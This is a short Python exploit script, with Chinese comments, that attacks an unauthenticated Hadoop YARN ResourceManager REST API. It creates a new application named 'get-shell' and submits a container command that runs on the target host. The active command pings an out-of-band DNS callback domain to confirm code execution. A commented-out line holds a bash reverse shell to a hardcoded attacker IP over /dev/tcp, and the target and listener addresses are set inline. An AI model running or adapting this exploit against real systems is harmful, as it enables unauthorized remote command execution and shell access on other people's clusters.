#!/usr/bin/env python

import requests

target = 'http://123.58.224.8:32573/'  # 将这里更改为目标主机地址，监听端口为9999
lhost = '39.101.76.53'  # 输入你的ip地址（外网反弹地址）在这里，是用来接收shell的回连地址，监听端口为9999

url = target + 'ws/v1/cluster/apps/new-application'
resp = requests.post(url)
print(resp.json())
app_id = resp.json()['application-id']
print('app_id: ', app_id)
url = target + 'ws/v1/cluster/apps'
data = {
    'application-id': app_id,
    'application-name': 'get-shell',
    'am-container-spec': {
        'commands': {
            # 'command': '/bin/bash -i >& /dev/tcp/39.101.76.53/3333 0>&1',
            'command': 'ping t2o94993.eyes.sh',
        },
    },
    'application-type': 'YARN',
}
requests.post(url, json=data)
